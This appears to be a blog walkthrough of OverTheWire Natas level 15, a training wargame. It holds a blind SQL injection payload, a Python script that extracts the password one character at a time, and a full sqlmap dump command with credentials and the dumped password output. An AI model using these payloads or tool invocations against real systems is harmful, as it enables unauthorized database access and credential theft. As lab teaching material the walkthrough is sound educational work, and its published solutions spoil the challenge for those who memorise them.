---
title: Over The Wire Natas - Level 15 Solution
tags: [WebExploitation, OverTheWire, Walkthrough, Natas, SQLInjection]
---

In this post we will tackle Level 15 of the OverTheWire Natas Games.


<!--more-->
# What do we know

What all things does the hint or the View Source tells us:

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```
So the table name is users and there are two columns username and password.

```
$link = mysqli_connect('localhost', 'natas15', '<censored>');
mysqli_select_db($link, 'natas15');
```
This looks to be a MySQL database hosted locally, can we accessed with username and a <censored> password, and the Database is `natas15`

```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

$res = mysqli_query($link, $query);
if($res) {
if(mysqli_num_rows($res) > 0) {
    echo "This user exists.<br>";
} else {
    echo "This user doesn't exist.<br>";
}
} else {
    echo "Error in query.<br>";
}

```
Ok so the `$_REQUEST["username"]` parameter is vulnerable since we execute the query on whatever is passed.

It checks if the Query is valid, and the checks if the number of rows returned is more then 0 or not, i.e atleast one such entry exists in the Database. If its more then 0 then it returns "This user exists." else the other message.


# How to Solve this 

Lets Look at how we could potentially solve this. Our goal here is to try to come up with the password for the next level. And the assumption here is that its stored in the Table hopefully for the `natas16` user.

Lets check if the user exists or not

Trying `username=natas16` works, it says that the user exists. 

Now we need to come up with a query such that it leaks information to us regarding the other entries. 
We know that there is another column called password so if we are to send

`natas16" AND BINARY password="12345`

assuming that the password is '12345' is correct then we would have gotten This User Exists.

Since we do not know the password, lets try to guess it one character at a time.

How can we do that 

We know that this commands are getting executed inside the WHERE clause, looking at https://www.w3schools.com/SQL/sql_where.asp we see that there are few operators that we can use, the one of Interest is:

LIKE Search for a pattern. 

Looking at its docs here - https://www.w3schools.com/SQL/sql_like.asp 

We see that it can be used to do a pattern match for values starting with, which is a good start.

WHERE CustomerName LIKE 'a%'	Finds any values that start with "a"

Lets try to use it in our case:

`natas16" AND password LIKE"A%` -> Returns This user doesn't exist.

`natas16" AND password LIKE"T%` -> Retuns This user exist.


so we can try to brute force the entire Password one Character at a Time.

There is one problem left, since MySQL is case-insensitive by default it will match T as well t if its in the password. To make it case sensitve we need to add BINARY.

`natas16" AND BINARY password LIKE"T%`

Lets try to code this up.

# Main Code Snippet

```python
brute_pwd = []
while (len(brute_pwd) != 32):
    for each_char in characters:
        data_text = {
            "username": 'natas16" AND BINARY password LIKE"' + "".join(brute_pwd) + each_char + '%'
            }
        response = session.post(url,
                                data=data_text,
            auth=(present_user, present_level_15_pwd)
        )
        response_content = response.text
        if ('This user exists' in response_content):
            brute_pwd.append(each_char)
            break
    print("Found partial", "".join(brute_pwd))
```

Here we are running a loop and trying to find it one Character at a time, at the end we will get something like:

```

```

# Alternate approach 

sqlmap - can also be used, however it will result in a lot of traffic, however to get a better understanding we can also use sqlmap as following:

```
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data "username=natas16" --dbms mysql -D natas15 -T users -C username,password --dump --level 5 --risk 3

```

Lets explain the command a bit more

`--string` : signifies what should be parsed in the response if the tool is performing good.

`--auth-type` : The Authentication Header that we see in the request would be basic and we also pass `--auth-cred` with the actual credentials. 

`--data` : What is the data that we want to send via POST request. The tool will look at this and try to find if any of the input results in SQLi.

`--dbms` : We know that the data base is MySql based on the source code.

`-D` : Database is natas15 

`-T` : Table is users 

`-C` : Columns that we are interested to dump

`--dump` : To dump all the information for the supplied D,T and C.

`--level` and `--risk` : Signifies that if we want to try it with more permutations or attempts to see if it is actually vulnerable to SQL injection or not. Note: Giving high values will create more traffic.


So with these out of the way, and sqlmap set to work we should be seeing something like

```
02:06:21] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 425 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=natas16" AND 4069=4069-- cAzs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas16" AND (SELECT 7129 FROM (SELECT(SLEEP(5)))foDm)-- LCyT
---
[02:06:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[02:06:35] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'
[02:06:35] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'
[02:06:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:06:35] [INFO] retrieved: 4
[02:06:37] [INFO] retrieved: 6P151OntQe
[02:06:54] [INFO] retrieved: bob
[02:07:00] [INFO] retrieved: HLwuGKts2w
[02:07:18] [INFO] retrieved: charlie
[02:07:30] [INFO] retrieved: hROtsfM734
[02:07:50] [INFO] retrieved: alice
[02:07:58] [INFO] retrieved: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
[02:08:56] [INFO] retrieved: natas16
Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
| natas16  | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |
+----------+----------------------------------+

[02:09:07] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'
[02:09:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'

```

This is great, and we did not write a script for it. I would only suggest this process once you know what actually is happening. Its better to get it done on your own with small scripts if you have the time and while learning so that you understand whats happening. Instead of relying on Ready Made tools.



# Continue Learning 

If you are able to understand Nepali Language, then perhaps you could also enjoy the YouTube Playlist that I have made for this topic going in Depth in each of the Levels.

